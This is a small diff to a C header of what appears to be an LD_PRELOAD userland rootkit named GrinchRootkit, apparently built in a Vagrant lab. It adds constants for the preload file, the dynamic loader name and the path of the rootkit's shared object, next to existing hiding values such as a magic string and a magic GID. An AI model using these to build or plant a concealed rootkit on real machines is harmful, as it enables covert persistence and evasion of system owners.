@@ -11,6 +11,9 @@
 #define PROC_NET_TCP6 "/proc/net/tcp6"
 
 #define PRELOAD_PATH "/etc/ld.so.preload"
+#define PRELOAD_FILE "ld.so.preload"
+#define LD_LIBRARY "ld-linux"
+#define MAGIC_PATH "/home/vagrant/GrinchRootkit/grinch.so"
 #define MAGIC_STRING "grinch"
 #define MAGIC_GID 73377
 
